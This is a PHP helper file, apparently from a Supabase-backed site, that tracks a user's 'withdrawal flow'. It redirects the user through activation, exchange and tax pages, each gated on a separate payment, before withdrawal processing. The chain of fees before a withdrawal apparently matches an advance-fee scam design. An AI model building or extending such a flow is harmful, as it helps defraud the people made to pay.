<?php
require_once __DIR__.'/supabase.php';

function vf_flow_profile(string $uid): array {
    return sb_profile($uid);
}

function vf_flow_stage(array $profile): string {
    $stage = (string)($profile['withdrawal_flow_stage'] ?? 'choose_withdrawal');
    $allowed = ['choose_withdrawal','activation','exchange','tax','withdrawal_processing','completed'];
    return in_array($stage, $allowed, true) ? $stage : 'choose_withdrawal';
}

function vf_flow_update(string $uid, array $data): void {
    $data['updated_at'] = date('c');
    sb_request('PATCH','/rest/v1/vf_profiles?id=eq.'.rawurlencode($uid),$data,true,null,['Prefer: return=minimal']);
}

function vf_flow_redirect_for_profile(array $profile): void {
    if ((string)($profile['activation_payment_status'] ?? '') === 'paid' || !empty($profile['activated'])) {
        $stage = vf_flow_stage($profile);
        if ($stage === 'activation' || $stage === 'choose_withdrawal') $stage = 'exchange';
        if ($stage === 'exchange' && (string)($profile['exchange_payment_status'] ?? '') === 'paid') $stage = 'tax';
        if ($stage === 'tax' && (string)($profile['tax_payment_status'] ?? '') === 'paid') $stage = 'withdrawal_processing';
        $map = ['exchange'=>'exchange.php','tax'=>'tax.php','withdrawal_processing'=>'withdrawal-processing.php','completed'=>'withdrawal-processing.php'];
        header('Location: '.($map[$stage] ?? 'exchange.php')); exit;
    }
}

?>
